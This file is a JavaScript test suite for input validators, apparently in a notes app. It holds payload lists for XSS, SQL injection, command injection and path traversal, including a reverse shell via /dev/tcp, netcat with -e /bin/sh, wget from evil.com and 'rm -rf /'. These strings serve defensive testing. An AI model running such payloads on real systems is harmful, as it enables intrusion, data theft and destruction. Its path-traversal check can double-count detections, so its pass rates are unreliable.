/**
 * Comprehensive Security Testing Suite
 * Tests all security implementations including XSS, SQL injection, command injection, and path traversal
 */

const { validator } = require('./inputValidation');
const { advancedValidator } = require('./advancedValidation');
const securityPolicy = require('./securityPolicy');

class SecurityTestSuite {
  constructor() {
    this.testResults = [];
    this.passedTests = 0;
    this.totalTests = 0;
  }

  /**
   * Run a test and record results
   * @param {string} testName - Name of the test
   * @param {Function} testFunction - Test function to execute
   */
  runTest(testName, testFunction) {
    this.totalTests++;
    console.log(`\n🔍 Running: ${testName}`);
    
    try {
      const result = testFunction();
      if (result === true || (typeof result === 'object' && result.passed)) {
        console.log(`✅ PASSED: ${testName}`);
        this.passedTests++;
        this.testResults.push({ test: testName, passed: true, details: result.details || 'Test passed' });
      } else {
        console.log(`❌ FAILED: ${testName}`);
        this.testResults.push({ test: testName, passed: false, details: result.details || 'Test failed' });
      }
    } catch (error) {
      console.log(`❌ ERROR: ${testName} - ${error.message}`);
      this.testResults.push({ test: testName, passed: false, details: error.message });
    }
  }

  /**
   * Test XSS prevention
   */
  testXSSPrevention() {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<style>@import "javascript:alert(1)"</style>',
      '<div onclick="alert(1)">click me</div>',
      '<input type="text" onfocus="alert(1)" autofocus>',
      '"><script>alert(1)</script>',
      "';alert(1);//",
      '<script>eval(atob("YWxlcnQoMSk="))</script>', // Base64 encoded alert(1)
    ];

    let detectedCount = 0;
    let sanitizedCount = 0;

    xssPayloads.forEach((payload, index) => {
      try {
        // Test XSS detection
        const validationResult = advancedValidator.comprehensiveValidation(payload);
        if (!validationResult.isValid) {
          detectedCount++;
        }

        // Test XSS sanitization
        const sanitized = advancedValidator.sanitizeXSS(payload);
        if (!sanitized.includes('<script') && !sanitized.includes('javascript:')) {
          sanitizedCount++;
        }
      } catch (error) {
        // Errors are good in this case - they mean the validation is working
        detectedCount++;
        sanitizedCount++;
      }
    });

    return {
      passed: detectedCount >= xssPayloads.length * 0.8 && sanitizedCount >= xssPayloads.length * 0.8,
      details: `Detected ${detectedCount}/${xssPayloads.length} XSS attempts, Sanitized ${sanitizedCount}/${xssPayloads.length} payloads`
    };
  }

  /**
   * Test SQL injection prevention
   */
  testSQLInjectionPrevention() {
    const sqlPayloads = [
      "'; DROP TABLE notes; --",
      "1' OR '1'='1",
      "1' UNION SELECT * FROM users --",
      "admin'--",
      "admin' OR 1=1 --",
      "'; EXEC xp_cmdshell('dir'); --",
      "1' AND (SELECT COUNT(*) FROM notes) > 0 --",
      "' UNION SELECT username, password FROM users --",
      "1'; WAITFOR DELAY '00:00:10'; --",
      "1' OR SLEEP(5) --",
      "1' OR 1=1 LIMIT 1 --",
      "' OR 'x'='x",
      "\\\"; EXEC sp_executesql N'SELECT * FROM notes'; --",
      "1' OR EXISTS(SELECT * FROM notes) --",
      "'; UPDATE notes SET content='hacked' WHERE 1=1; --"
    ];

    let detectedCount = 0;

    sqlPayloads.forEach(payload => {
      const result = validator.containsSqlInjection(payload);
      if (result.detected || result.legacy) {
        detectedCount++;
      }
    });

    return {
      passed: detectedCount >= sqlPayloads.length * 0.9,
      details: `Detected ${detectedCount}/${sqlPayloads.length} SQL injection attempts`
    };
  }

  /**
   * Test command injection prevention
   */
  testCommandInjectionPrevention() {
    const commandPayloads = [
      "; rm -rf /",
      "| cat /etc/passwd",
      "&& wget http://evil.com/malware",
      "`id`",
      "$(whoami)",
      "; ls -la /",
      "| nc -l -p 4444 -e /bin/sh",
      "; curl http://attacker.com",
      "&& powershell.exe -Command Get-Process",
      "| cmd.exe /c dir",
      "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
      "${jndi:ldap://evil.com/a}",
      "& ping -c 4 google.com",
      "|| echo 'command injection'",
      "; /bin/bash -c 'echo vulnerable'"
    ];

    let detectedCount = 0;

    commandPayloads.forEach(payload => {
      const result = validator.containsCommandInjection(payload);
      if (result.detected || result.legacy) {
        detectedCount++;
      }
    });

    return {
      passed: detectedCount >= commandPayloads.length * 0.9,
      details: `Detected ${detectedCount}/${commandPayloads.length} command injection attempts`
    };
  }

  /**
   * Test path traversal prevention
   */
  testPathTraversalPrevention() {
    const pathPayloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "~/../../etc/passwd",
      "/var/www/../../../etc/passwd",
      "C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "file:///etc/passwd",
      "....\\....\\....\\etc\\passwd",
      "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd",
      "..%5c..%5c..%5cetc%5cpasswd",
      "\\..\\..\\..\\etc\\passwd",
      "file:///../../../etc/passwd",
      ".\\..\\..\\..\\windows\\system32\\config\\sam"
    ];

    let detectedCount = 0;

    pathPayloads.forEach(payload => {
      try {
        const result = validator.containsPathTraversal(payload);
        if (result.detected || result.legacy) {
          detectedCount++;
        }
        
        // Also test path validation
        try {
          validator.validateFilePath(payload);
          // If no error, it wasn't detected
        } catch (error) {
          detectedCount++;
        }
      } catch (error) {
        // Validation errors are good - they mean detection is working
        detectedCount++;
      }
    });

    return {
      passed: detectedCount >= pathPayloads.length * 0.8,
      details: `Detected ${detectedCount}/${pathPayloads.length} path traversal attempts`
    };
  }

  /**
   * Test input validation functions
   */
  testInputValidation() {
    let validationTests = 0;
    let validationPassed = 0;

    // Test note ID validation
    const validNoteIds = ['note_123', 'test-note', 'note_abc_123'];
    const invalidNoteIds = ['', 'a'.repeat(100), 'note with spaces', 'note<script>', 'note;rm'];

    validNoteIds.forEach(id => {
      validationTests++;
      try {
        validator.validateNoteId(id);
        validationPassed++;
      } catch (error) {
        console.warn(`Valid note ID rejected: ${id} - ${error.message}`);
      }
    });

    invalidNoteIds.forEach(id => {
      validationTests++;
      try {
        validator.validateNoteId(id);
        console.warn(`Invalid note ID accepted: ${id}`);
      } catch (error) {
        validationPassed++;
      }
    });

    // Test content validation
    const validContents = ['Hello world', 'This is a test note\nWith multiple lines'];
    const invalidContents = ['<script>alert(1)</script>', 'x'.repeat(100000), 'javascript:alert(1)'];

    validContents.forEach(content => {
      validationTests++;
      try {
        validator.sanitizeText(content);
        validationPassed++;
      } catch (error) {
        console.warn(`Valid content rejected: ${content.substring(0, 50)} - ${error.message}`);
      }
    });

    invalidContents.forEach(content => {
      validationTests++;
      try {
        const sanitized = validator.sanitizeText(content);
        if (!sanitized.includes('<script') && !sanitized.includes('javascript:')) {
          validationPassed++;
        }
      } catch (error) {
        validationPassed++;
      }
    });

    return {
      passed: validationPassed >= validationTests * 0.9,
      details: `${validationPassed}/${validationTests} validation tests passed`
    };
  }

  /**
   * Test rate limiting
   */
  testRateLimiting() {
    const rateLimiter = validator.createRateLimiter(5, 1000);
    let limitTests = 0;
    let limitPassed = 0;

    // Should allow first 5 requests
    for (let i = 0; i < 5; i++) {
      limitTests++;
      try {
        rateLimiter('test-user');
        limitPassed++;
      } catch (error) {
        console.warn(`Rate limiter incorrectly blocked request ${i + 1}`);
      }
    }

    // Should block 6th request
    limitTests++;
    try {
      rateLimiter('test-user');
      console.warn('Rate limiter failed to block request');
    } catch (error) {
      limitPassed++;
    }

    return {
      passed: limitPassed >= limitTests * 0.8,
      details: `${limitPassed}/${limitTests} rate limiting tests passed`
    };
  }

  /**
   * Test security policy configuration
   */
  testSecurityPolicy() {
    let policyTests = 0;
    let policyPassed = 0;

    // Test policy structure
    const requiredSections = ['detection', 'validation', 'rateLimit', 'resources'];
    requiredSections.forEach(section => {
      policyTests++;
      if (securityPolicy[section]) {
        policyPassed++;
      }
    });

    // Test validation rules
    const validationRules = ['noteContent', 'noteId', 'color'];
    validationRules.forEach(rule => {
      policyTests++;
      if (securityPolicy.validation[rule] && securityPolicy.validation[rule].maxLength) {
        policyPassed++;
      }
    });

    // Test rate limit configuration
    const operations = ['save-note-content', 'change-note-color', 'create-new-note'];
    operations.forEach(op => {
      policyTests++;
      if (securityPolicy.rateLimit.operations[op]) {
        policyPassed++;
      }
    });

    return {
      passed: policyPassed >= policyTests * 0.9,
      details: `${policyPassed}/${policyTests} security policy tests passed`
    };
  }

  /**
   * Test comprehensive validation
   */
  testComprehensiveValidation() {
    const testCases = [
      {
        input: '<script>alert("xss")</script>DROP TABLE notes;--',
        expectThreats: ['xss'],
        description: 'Mixed XSS and SQL injection'
      },
      {
        input: '../../../../etc/passwd && rm -rf /',
        expectThreats: ['path_traversal', 'command_injection'],
        description: 'Path traversal with command injection'
      },
      {
        input: 'Normal text content',
        expectThreats: [],
        description: 'Clean content'
      },
      {
        input: 'javascript:alert(1) OR 1=1',
        expectThreats: ['xss', 'sql_injection'],
        description: 'JavaScript protocol with SQL injection'
      }
    ];

    let comprehensiveTests = 0;
    let comprehensivePassed = 0;

    testCases.forEach(testCase => {
      comprehensiveTests++;
      try {
        const result = advancedValidator.comprehensiveValidation(testCase.input);
        
        if (testCase.expectThreats.length === 0) {
          // Should be valid for clean content
          if (result.isValid || result.confidence < 0.3) {
            comprehensivePassed++;
          }
        } else {
          // Should detect threats
          if (!result.isValid && result.threats.length > 0) {
            comprehensivePassed++;
          }
        }
      } catch (error) {
        if (testCase.expectThreats.length > 0) {
          // Errors are expected for malicious content
          comprehensivePassed++;
        }
      }
    });

    return {
      passed: comprehensivePassed >= comprehensiveTests * 0.8,
      details: `${comprehensivePassed}/${comprehensiveTests} comprehensive validation tests passed`
    };
  }

  /**
   * Run all security tests
   */
  runAllTests() {
    console.log('🔒 Starting Comprehensive Security Test Suite\n');
    console.log('=' * 60);

    this.runTest('XSS Prevention', () => this.testXSSPrevention());
    this.runTest('SQL Injection Prevention', () => this.testSQLInjectionPrevention());
    this.runTest('Command Injection Prevention', () => this.testCommandInjectionPrevention());
    this.runTest('Path Traversal Prevention', () => this.testPathTraversalPrevention());
    this.runTest('Input Validation', () => this.testInputValidation());
    this.runTest('Rate Limiting', () => this.testRateLimiting());
    this.runTest('Security Policy Configuration', () => this.testSecurityPolicy());
    this.runTest('Comprehensive Validation', () => this.testComprehensiveValidation());

    console.log('\n' + '=' * 60);
    console.log(`\n📊 Test Results: ${this.passedTests}/${this.totalTests} tests passed`);
    
    const successRate = (this.passedTests / this.totalTests) * 100;
    
    if (successRate >= 90) {
      console.log('🎉 EXCELLENT: Security implementation is comprehensive and robust!');
    } else if (successRate >= 80) {
      console.log('✅ GOOD: Security implementation is solid with minor issues.');
    } else if (successRate >= 70) {
      console.log('⚠️  FAIR: Security implementation needs improvement.');
    } else {
      console.log('❌ POOR: Security implementation has significant issues.');
    }

    // Show failed tests
    const failedTests = this.testResults.filter(result => !result.passed);
    if (failedTests.length > 0) {
      console.log('\n🔍 Failed Tests:');
      failedTests.forEach(test => {
        console.log(`  ❌ ${test.test}: ${test.details}`);
      });
    }

    return {
      passed: this.passedTests,
      total: this.totalTests,
      successRate: successRate,
      results: this.testResults
    };
  }
}

// Export for use in other modules
module.exports = SecurityTestSuite;

// Run tests if this file is executed directly
if (require.main === module) {
  const testSuite = new SecurityTestSuite();
  const results = testSuite.runAllTests();
  
  console.log('\n📄 Generating detailed security report...');
  
  // Generate detailed report
  const report = {
    timestamp: new Date().toISOString(),
    summary: {
      totalTests: results.total,
      passedTests: results.passed,
      successRate: results.successRate,
      status: results.successRate >= 80 ? 'SECURE' : 'NEEDS_ATTENTION'
    },
    details: results.results,
    recommendations: [
      'Regularly update security patterns and validation rules',
      'Monitor security logs for emerging threats',
      'Conduct periodic security assessments',
      'Keep dependencies updated for security patches',
      'Review and update security policies quarterly'
    ]
  };

  // Save report
  const fs = require('fs');
  const path = require('path');
  
  try {
    fs.writeFileSync(
      path.join(__dirname, '../../security-validation-report.json'),
      JSON.stringify(report, null, 2)
    );
    console.log('📄 Detailed security report saved to security-validation-report.json');
  } catch (error) {
    console.error('Failed to save security report:', error.message);
  }

  process.exit(results.successRate >= 80 ? 0 : 1);
}